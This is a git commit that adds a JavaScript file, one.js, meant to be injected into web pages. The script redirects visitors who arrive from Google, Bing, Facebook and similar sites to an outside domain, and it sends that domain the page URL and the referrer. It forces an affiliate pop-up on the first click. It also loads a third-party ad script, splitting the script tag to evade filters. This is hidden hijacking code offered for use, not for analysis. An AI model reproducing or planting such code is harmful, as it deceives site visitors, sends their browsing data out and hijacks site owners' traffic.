0232ce1e98242476f7f4149dd47478750d571d2e
mychiara <85479169+mychiara@users.noreply.github.com>
2022-03-30 08:19:42 +0800

    Create one.js

---
+++ one.js
@@ -0,0 +1,31 @@
+type='text/javascript'>
+//<![CDATA[
+      if(document.referrer)
+    {
+    	var cek = document.referrer;
+
+    	var ars 	= rChoice([
+							'https://oneorbit.xyz/',
+							]);
+
+				function rChoice(arr) {
+    			return arr[Math.floor(arr.length * Math.random())];
+	}
+
+	//Code arsae client javascript
+	if(['.google.', 'bing.', 'yandex.', 'facebook.', 'pinterest.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
+    }
+  
+  
+	$(document).ready(function()
+	{
+	  $('body').addClass('xepo_ads');
+	});
+
+	$(document).on('click','.xepo_ads',function(e)
+	{
+	    $(this).removeClass('xepo_ads');
+	    window.open('https://shope.ee/6Uhmz5pJ0c','_blank');
+	});
+document.write('<scr' + 'ipt type="text/javascript" src="http' + (location.protocol === 'https:' ? 's' : '') + '://pl15139236.safestgatetocontent.com/41/07/05/410705d22ad2cf0ef08f17bcc337d242.js"></scr' + 'ipt>');
+//]]>
